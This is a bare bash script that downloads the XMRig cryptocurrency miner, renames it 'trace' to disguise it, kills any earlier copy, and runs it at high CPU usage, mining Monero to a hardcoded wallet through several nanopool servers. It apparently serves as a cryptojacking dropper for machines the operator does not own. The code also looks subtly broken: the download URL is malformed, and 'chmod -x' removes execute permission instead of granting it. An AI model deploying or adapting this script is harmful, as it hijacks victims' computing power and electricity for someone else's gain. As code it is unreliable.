#!/bin/bash
 
if pgrep trace; then pkill trace; fi
 
threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";
 
rm -rf config.json;
 
d () {
	curl -L --insecure --connect-timeout 30 --max-time 800 --fail "$1" -o "$2" 2> /dev/null || wget --no-check-certificate --timeout 800 --tries 1 "$1" -O "$2" 2> /dev/null || _curl "$1" > "$2";
}
 
test ! -s trace && \
    d https://github.com\xmrig/xmrig/releases/download/v5.0.0/xmrig-5.0.0-xenial-x64.tar.gz trace.tgz && \
    tar -zxvf trace.tgz && \
    mv xmrig-5.0.0/xmrig trace && \
    rm -rf xmrig-5.0.0 && \
    rm -rf trace.tgz;
test ! -x trace && chmod -x trace;
 
k() {
    ./trace \
        -r 2 \
        -R 2 \
        --keepalive \
        --no-color \
        --donate-level 1 \
        --max-cpu-usage 85 \
        --cpu-priority 3 \
        --print-time 25 \
        --threads "${threadCount:-4}" \
        --url "$1" \
        --user 89nHQ5LURzg15o7o3BhQ9GEHTUr3TusgAEeJ4peMGKbwifVgd2hwdtuhGwK2A7rZ74EMqwEdBRstDc1PG8TecXkCMog6ug6 \
        --pass x \
        --coin xmr \
        --keepalive
}
 
k xmr-asia1.nanopool.org:14444 || k xmr-eu2.nanopool.org:14444 || k xmr-us-east1.nanopool.org:14444 || k xmr-us-west1.nanopool.org:14444 || k xmr-asia1.nanopool.org:14444 || k xmr-jp1.nanopool.org:14444
